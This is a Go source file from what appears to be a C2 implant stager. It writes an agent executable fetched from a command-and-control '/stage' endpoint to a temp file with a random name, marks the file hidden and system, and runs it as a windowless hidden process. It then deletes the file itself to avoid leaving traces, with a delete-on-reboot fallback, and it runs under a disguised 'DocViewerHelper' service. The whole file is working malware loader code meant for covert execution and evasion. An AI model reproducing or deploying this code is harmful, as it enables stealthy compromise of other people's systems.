// dropfile.go — Staged V2 execution path: drop the agent PE to a temp file,
// start it as a normal child process, then self-delete the temp file.
//
// This is the default (STAGE_MODE=file) replacement for the module-stomp/hollow
// path. Go agents crash when hollowed/stomped (known Go+hollowing limit), but
// run correctly as a regular process. The agent bytes are fetched from C2
// /stage at runtime and never persist on disk: only a transient temp file
// exists during launch, then it is removed (with a delete-on-reboot fallback).

package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	CREATE_NO_WINDOW            = 0x08000000
	STARTF_USESHOWWINDOW        = 0x00000001
	MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004
	FILE_ATTRIBUTE_HIDDEN       = 0x00000002
	FILE_ATTRIBUTE_SYSTEM       = 0x00000004
)

var (
	procMoveFileExW        = modKernel32H.NewProc("MoveFileExW")
	procSetFileAttributesW = modKernel32H.NewProc("SetFileAttributesW")
)

// stageMode selects the staged execution path: "file" (drop→run→delete,
// default) or "stomp" (module stomping / hollowing — Go-hostile, lab A/B).
func stageMode() string {
	if v := os.Getenv("STAGE_MODE"); v != "" && !strings.HasPrefix(v, "{{") {
		return strings.ToLower(v)
	}
	p := "{{STAGE_MODE}}"
	if strings.HasPrefix(p, "{{") || p == "" {
		return "file"
	}
	return strings.ToLower(p)
}

// dropDir returns where the agent PE is dropped before launch. Defaults to the
// system temp dir (C:\Windows\Temp under the DocViewerHelper service).
func dropDir() string {
	if v := os.Getenv("STAGE_DROP_DIR"); v != "" && !strings.HasPrefix(v, "{{") {
		return v
	}
	p := "{{STAGE_DROP_DIR}}"
	if strings.HasPrefix(p, "{{") || p == "" {
		return os.TempDir()
	}
	return p
}

// spawnProcess starts path as a hidden child process (not suspended).
func spawnProcess(path string) (*processInformation, error) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}
	si := &startupInfo{
		cb:          uint32(unsafe.Sizeof(startupInfo{})),
		dwFlags:     STARTF_USESHOWWINDOW,
		wShowWindow: 0, // SW_HIDE
	}
	pi := &processInformation{}
	r, _, e := procCreateProcessWH.Call(
		0, uintptr(unsafe.Pointer(pathPtr)),
		0, 0, 0,
		CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CreateProcessW(%s): %v", path, e)
	}
	return pi, nil
}

func setHidden(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	procSetFileAttributesW.Call(uintptr(unsafe.Pointer(ptr)), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM)
}

// deleteFileSelf removes path, retrying while the child still has it mapped. If
// deletion stays locked, falls back to delete-on-reboot via MoveFileExW.
func deleteFileSelf(path string) error {
	for i := 0; i < 30; i++ {
		if err := os.Remove(path); err == nil {
			return nil
		}
		time.Sleep(100 * time.Millisecond)
	}
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	r, _, e := procMoveFileExW.Call(uintptr(unsafe.Pointer(ptr)), 0, MOVEFILE_DELAY_UNTIL_REBOOT)
	if r == 0 {
		return fmt.Errorf("MoveFileExW delete-on-reboot: %v", e)
	}
	return nil
}

func randTempName() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("dv%d.tmp", time.Now().UnixNano())
	}
	return hex.EncodeToString(b) + ".tmp"
}

// dropRunDelete fetches payload — done by the caller — writes it to a temp
// file, runs it as its own process, then self-deletes the file.
func dropRunDelete(payload []byte) error {
	dir := dropDir()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("drop mkdir %s: %w", dir, err)
	}
	path := filepath.Join(dir, randTempName())
	if err := os.WriteFile(path, payload, 0o600); err != nil {
		return fmt.Errorf("drop write: %w", err)
	}
	setHidden(path)
	pi, err := spawnProcess(path)
	if err != nil {
		_ = os.Remove(path)
		return err
	}
	procCloseHandleH.Call(pi.ProcessHandle)
	procCloseHandleH.Call(pi.ThreadHandle)
	if err := deleteFileSelf(path); err != nil {
		fmt.Fprintf(os.Stderr, "drop-run-delete: self-delete deferred (%v)\n", err)
	}
	fmt.Fprintf(os.Stderr, "drop-run-delete: OK pid=%d path=%s\n", pi.ProcessID, path)
	return nil
}
